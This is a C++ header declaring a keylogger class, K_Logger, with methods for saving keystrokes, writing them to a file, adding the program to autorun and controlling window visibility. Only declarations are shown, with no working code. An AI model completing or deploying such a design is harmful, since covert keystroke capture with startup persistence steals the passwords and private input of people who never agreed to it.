#pragma once


/*******************************************************************/

/* Date: 10-06-2018                                                */

/* Developer: Artem Gord1728                                       */

/* Copyright © 2018 Artem Gord1728. All rights reserved.           */

/* Description: Header with basic functionality                    */

/*******************************************************************/



#include <iostream>
#include <Windows.h>
#include "os_paths/windows_os_paths.h"
#include "os_paths/linux_os_paths.h"
#include <fstream>
#include <stdlib.h>
#include <string>
#include <time.h>
#include <stdio.h>



using std::fstream;
using std::cout;
using std::endl;
using std::string;


class K_Logger
{
public:
	int SaveSymbol(WORD iKey);
	void AddToAutorun();

private:
	void WriteToDoc(const LPCSTR text, WindowsOSPath windows_path);

protected:
	void VisibilityApp();
}; 
